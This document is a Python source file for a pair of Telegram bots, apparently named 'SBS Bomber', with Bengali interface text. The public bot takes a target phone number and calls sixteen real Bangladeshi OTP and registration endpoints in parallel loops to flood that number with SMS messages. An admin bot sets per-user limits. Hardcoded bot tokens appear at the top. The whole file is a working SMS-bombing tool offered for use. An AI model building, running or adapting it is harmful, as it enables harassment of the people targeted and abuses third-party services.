# Created by SBS | Admin System Fixed
# 16 High-Success API Slots | Precise Header Handling
# Features: Dynamic Auth, Admin Panel, Persistence

import telebot
import random
import string
import time
import requests
import threading
import json
import os
from concurrent.futures import ThreadPoolExecutor

# --- কনফিগারেশন ---
PUBLIC_BOT_TOKEN = "8340214451:AAGZc4s23PlC2lYT3XsxV29b0KolJYdlfk0"
ADMIN_BOT_TOKEN = "8510115370:AAGDZJl7lsARnTrkIW2kPXRzQAngRrF-wCU"

# গ্লোবাল ভ্যারিয়েবল
DB_FILE = "sbs_pro_database.json"
user_states = {}
users_db = {}
ADMIN_ID = 0
bot_active = True

def load_db():
    global users_db, bot_active, ADMIN_ID
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                users_db = data.get("users", {})
                bot_active = data.get("bot_active", True)
                ADMIN_ID = data.get("admin_id", 0)
        except:
            users_db = {}
            bot_active = True
            ADMIN_ID = 0

def save_db():
    with open(DB_FILE, "w") as f:
        json.dump({
            "users": users_db, 
            "bot_active": bot_active, 
            "admin_id": ADMIN_ID
        }, f, indent=4)

load_db()

public_bot = telebot.TeleBot(PUBLIC_BOT_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)

# --- ওটিপি এপিআই স্লট (১৬টি) ---

def get_headers(host):
    return {
        "Content-Type": "application/json; charset=utf-8",
        "Host": host,
        "User-Agent": "okhttp/3.9.1",
        "Connection": "Keep-Alive"
    }

def api_1(n): # Easy
    try:
        p = "".join(random.choices(string.digits, k=8))
        data = {"password": p, "password_confirmation": p, "device_key": p, "name": "SBS", "mobile": n, "email": f"{p}@gmail.com"}
        r = requests.post("https://core.easy.com.bd/api/v1/registration", json=data, headers=get_headers("core.easy.com.bd"), timeout=8)
        return r.status_code == 200
    except: return False

def api_2(n): # GovTr
    try:
        r = requests.post("https://training.gov.bd/backoffice/api/user/sendOtp", json={"mobile": n}, headers=get_headers("training.gov.bd"), timeout=8)
        return r.status_code == 200
    except: return False

def api_3(n): # Qcoom
    try:
        r = requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": f"+88{n}"}, headers=get_headers("auth.qcoom.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_4(n): # Apex
    try:
        r = requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": n}, headers=get_headers("api.apex4u.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_5(n): # OsudPotro
    try:
        r = requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"os": "web", "mobile": f"+88-{n}", "language": "en", "deviceToken": "web"}, headers=get_headers("api.osudpotro.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_6(n): # BusBD
    try:
        r = requests.post("https://api.busbd.com.bd/api/auth", json={"phone": f"+88{n}"}, headers=get_headers("api.busbd.com.bd"), timeout=8)
        return r.status_code == 200
    except: return False

def api_7(n): # GPShop
    try:
        r = requests.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": n, "language": "en", "email": ""}, headers=get_headers("bkshopthc.grameenphone.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_8(n): # Deshal
    try:
        r = requests.post("https://app.deshal.net/api/auth/login", json={"phone": n}, headers=get_headers("app.deshal.net"), timeout=8)
        return r.status_code == 200
    except: return False

def api_9(n): # Chorki
    try:
        r = requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", json={"number": f"+88{n}"}, headers=get_headers("api-dynamic.chorki.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_10(n): # Regal
    try:
        p = "".join(random.choices(string.digits, k=6))
        data = {"emergency_contact_number": n, "password": p, "password_confirmation": p, "name": "SBS", "email": f"{p}@gmail.com", "agree": True}
        r = requests.post("https://regalfurniturebd.com/api/auth/register", json=data, headers=get_headers("regalfurniturebd.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_11(n): # Robi
    try:
        r = requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": n}, headers=get_headers("da-api.robi.com.bd"), timeout=8)
        return r.status_code == 200
    except: return False

def api_12(n): # Shikho
    try:
        r = requests.post("https://api.shikho.com/public/activity/otp", json={"phone": n, "intent": "ap-discount-request"}, headers=get_headers("api.shikho.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_13(n): # GariBook
    try:
        r = requests.post("https://api.garibookadmin.com/api/v3/user/login", json={"mobile": n, "channel": "web"}, headers=get_headers("api.garibookadmin.com"), timeout=8)
        return r.status_code == 200
    except: return False

def api_14(n): # Pathao
    try:
        r = requests.post("https://api.pathao.com/v2/auth/register", json={"country_prefix": "880", "national_number": n[1:], "country_id": 1}, headers={"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json"}, timeout=8)
        return r.status_code == 200
    except: return False

def api_15(n): # Fundesh
    try:
        r = requests.post("https://fundesh.com.bd/api/auth/generateOTP", json={"msisdn": n[1:]}, headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
        return r.status_code == 200
    except: return False

def api_16(n): # Hishabee
    try:
        s = requests.Session()
        res1 = s.get("https://web.hishabee.business/auth", timeout=8)
        csrf = res1.cookies.get('__Host-authjs.csrf-token', '')
        headers = {"Next-Action": "99a8ce094437bb79461fdc714e10a9ff1d2b23a3", "Content-Type": "text/plain;charset=UTF-8", "Cookie": f"__Host-authjs.csrf-token={csrf}"}
        res2 = s.post("https://web.hishabee.business/auth/otp", headers=headers, data=json.dumps([{"mobile_number": n}]), timeout=8)
        return res2.status_code == 200
    except: return False

# --- বম্বিং কোর ---

def run_bombing(chat_id, number, amount):
    actual_success = 0
    public_bot.send_message(chat_id, f"🚀 বম্বিং শুরু হচ্ছে...\n📱 টার্গেট: `{number}`\n🔥 মোট রিকোয়েস্ট: `{amount}` (১৬টি এপিআই)\n\n🛡️ *Created by SBS*", parse_mode="Markdown")
    
    apis = [api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, 
            api_9, api_10, api_11, api_12, api_13, api_14, api_15, api_16]

    for i in range(amount):
        with ThreadPoolExecutor(max_workers=16) as executor:
            futures = [executor.submit(api_func, number) for api_func in apis]
            for future in futures:
                if future.result():
                    actual_success += 1
        time.sleep(1) # ১ সেকেন্ড বিরতি
            
    public_bot.send_message(chat_id, f"✅ বম্বিং সম্পন্ন!\n🎯 টার্গেট: {number}\n💥 সফল ওটিপি রেসপন্স: {actual_success}\n\n💎 *Admin: @mdazizamin*", parse_mode="Markdown")

# ================= ADMIN HANDLERS =================

@admin_bot.message_handler(commands=['auth', 'authorize'])
def admin_auth(message):
    global ADMIN_ID
    ADMIN_ID = message.from_user.id
    # এডমিনকে ইউজারের তালিকায়ও আনলিমিটেড করে রাখা
    users_db[str(ADMIN_ID)] = {'approved': True, 'blocked': False, 'limit': 999999, 'name': 'Owner'}
    save_db()
    admin_bot.reply_to(message, f"👑 *Success!*\nআপনি এখন এডমিন হিসেবে অনুমোদিত।\nআপনার আইডি: `{ADMIN_ID}`\nমেনু দেখতে `/start` লিখুন।", parse_mode="Markdown")

@admin_bot.message_handler(commands=['start', 'menu'])
def admin_menu(message):
    if message.from_user.id != ADMIN_ID:
        admin_bot.reply_to(message, "❌ আপনি এডমিন নন। এডমিন হতে `/auth` লিখুন।")
        return
    menu = (
        "🛠️ *SBS Admin Control Panel*\n"
        "------------------------------\n"
        "✅ `/approve ID` - নতুন ইউজারকে অনুমতি দিন\n"
        "🚫 `/block ID` - ইউজারকে চিরস্থায়ী ব্লক করুন\n"
        "🔓 `/unblock ID` - ইউজারকে আনব্লক করুন\n"
        "⚙️ `/limit ID Count` - ওটিপি লিমিট পরিবর্তন করুন\n"
        "👥 `/users` - সব ইউজারের তালিকা দেখুন\n"
        "🟢 `/on` - পাবলিক বট চালু করুন\n"
        "🔴 `/off` - পাবলিক বট বন্ধ করুন\n"
        "📢 `/broadcast Text` - সব ইউজারকে মেসেজ পাঠান\n"
        "------------------------------\n"
        f"Admin ID: `{ADMIN_ID}`"
    )
    admin_bot.send_message(message.chat.id, menu, parse_mode="Markdown")

@admin_bot.message_handler(commands=['approve'])
def cmd_approve(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = message.text.split()[1]
        if uid not in users_db: users_db[uid] = {}
        users_db[uid].update({'approved': True, 'blocked': False, 'limit': 1000, 'name': 'Approved User'})
        save_db()
        admin_bot.reply_to(message, f"✅ User `{uid}` Approved with 1000 limit!")
        public_bot.send_message(uid, "🎉 অভিনন্দন! এডমিন আপনাকে ১০০০ লিমিটসহ অনুমতি দিয়েছেন।")
    except: admin_bot.reply_to(message, "ব্যবহার: `/approve ID`")

@admin_bot.message_handler(commands=['block'])
def cmd_block(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = message.text.split()[1]
        if uid in users_db:
            users_db[uid]['blocked'] = True
            save_db()
            admin_bot.reply_to(message, f"🚫 User `{uid}` Blocked!")
            public_bot.send_message(uid, "❌ আপনাকে বট থেকে ব্লক করা হয়েছে।")
    except: admin_bot.reply_to(message, "ব্যবহার: `/block ID`")

@admin_bot.message_handler(commands=['unblock'])
def cmd_unblock(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = message.text.split()[1]
        if uid in users_db:
            users_db[uid]['blocked'] = False
            save_db()
            admin_bot.reply_to(message, f"🔓 User `{uid}` Unblocked!")
            public_bot.send_message(uid, "✅ আপনার ব্লক খুলে দেওয়া হয়েছে।")
    except: admin_bot.reply_to(message, "ব্যবহার: `/unblock ID`")

@admin_bot.message_handler(commands=['limit'])
def cmd_limit(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        uid, count = args[1], int(args[2])
        if uid in users_db:
            users_db[uid]['limit'] = count
            save_db()
            admin_bot.reply_to(message, f"⚙️ User `{uid}` লিমিট `{count}` এ সেট করা হয়েছে।")
    except: admin_bot.reply_to(message, "ব্যবহার: `/limit ID Count`")

@admin_bot.message_handler(commands=['users'])
def cmd_users(message):
    if message.from_user.id != ADMIN_ID: return
    if not users_db:
        admin_bot.reply_to(message, "কোনো ইউজার নেই।")
        return
    msg = "👥 *User List:*\n"
    for uid, data in users_db.items():
        status = "✅ Approved" if data.get('approved') else "⏳ Pending"
        block = "🚫 Blocked" if data.get('blocked') else "🔓 Active"
        msg += f"ID: `{uid}` | {status} | {block} | Lim: {data.get('limit')}\n"
    admin_bot.send_message(message.chat.id, msg, parse_mode="Markdown")

@admin_bot.message_handler(commands=['on', 'off'])
def cmd_toggle(message):
    if message.from_user.id != ADMIN_ID: return
    global bot_active
    bot_active = True if "on" in message.text.lower() else False
    save_db()
    admin_bot.reply_to(message, f"🤖 পাবলিক বট এখন: {'সচল (ON)' if bot_active else 'বন্ধ (OFF)'}")

@admin_bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    text = " ".join(message.text.split()[1:])
    if not text:
        admin_bot.reply_to(message, "মেসেজ লিখুন।")
        return
    count = 0
    for uid in users_db:
        try:
            public_bot.send_message(uid, f"📢 *Admin Notice:*\n\n{text}", parse_mode="Markdown")
            count += 1
        except: pass
    admin_bot.reply_to(message, f"✅ {count} জন ইউজারের কাছে নোটিশ পাঠানো হয়েছে।")

# ================= PUBLIC HANDLERS =================

@public_bot.message_handler(commands=['start'])
def pub_start(message):
    uid = str(message.from_user.id)
    if uid not in users_db:
        users_db[uid] = {'approved': False, 'blocked': False, 'limit': 0, 'name': message.from_user.first_name}
        save_db()
        if ADMIN_ID != 0:
            admin_bot.send_message(ADMIN_ID, f"🔔 *New Request*\nID: `{uid}`\nApprove করতে: `/approve {uid}`", parse_mode="Markdown")
        public_bot.reply_to(message, f"⏳ আপনার আইডি (`{uid}`) পেন্ডিং আছে। এডমিন অনুমতি দিলে ব্যবহার করতে পারবেন।\n\n💎 *Admin: @mdazizamin*", parse_mode="Markdown")
        return
    
    if users_db[uid]['blocked']:
        public_bot.reply_to(message, "❌ আপনাকে বট থেকে ব্লক করা হয়েছে।")
        return
    
    if not users_db[uid]['approved']:
        public_bot.reply_to(message, "⏳ আপনার আইডিটি অনুমোদনের অপেক্ষায় আছে।")
        return

    limit = users_db[uid]['limit']
    public_bot.reply_to(message, f"🔥 *SBS Bomber* অনলাইন!\nআপনার লিমিট: `{limit}`\nটার্গেট নাম্বার দিন (০১৭...)\n\n🛡️ *Created by SBS*", parse_mode="Markdown")

@public_bot.message_handler(func=lambda m: True)
def handle_input(message):
    uid = str(message.from_user.id)
    if uid not in users_db or not users_db[uid]['approved'] or users_db[uid]['blocked']: return
    
    if not bot_active and int(uid) != ADMIN_ID:
        public_bot.reply_to(message, "⚠️ বট বর্তমানে রক্ষণাবেক্ষণের জন্য বন্ধ আছে।")
        return

    text = message.text.strip()
    if text.isdigit() and len(text) == 11:
        user_states[uid] = {'number': text}
        public_bot.reply_to(message, f"🎯 টার্গেট: `{text}`\nপরিমাণ লিখুন।")
        public_bot.register_next_step_handler(message, get_amount)
    else: public_bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন।")

def get_amount(message):
    uid = str(message.from_user.id)
    if message.text.isdigit():
        amount = int(message.text)
        limit = users_db[uid].get('limit', 0)
        if amount > limit and int(uid) != ADMIN_ID: amount = limit
        num = user_states[uid]['number']
        threading.Thread(target=run_bombing, args=(uid, num, amount), daemon=True).start()
    else: public_bot.reply_to(message, "❌ সংখ্যায় পরিমাণ লিখুন।")

# --- বট স্টার্টআপ ---
def start_bot(bot_obj, name):
    print(f"{name} starting...")
    bot_obj.remove_webhook()
    time.sleep(1)
    while True:
        try:
            bot_obj.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Error in {name}: {e}")
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=start_bot, args=(public_bot, "Public Bot"), daemon=True).start()
    threading.Thread(target=start_bot, args=(admin_bot, "Admin Bot"), daemon=True).start()
    print("SBS Double Bots are Live! Type /auth in Admin Bot.")
    while True: time.sleep(10)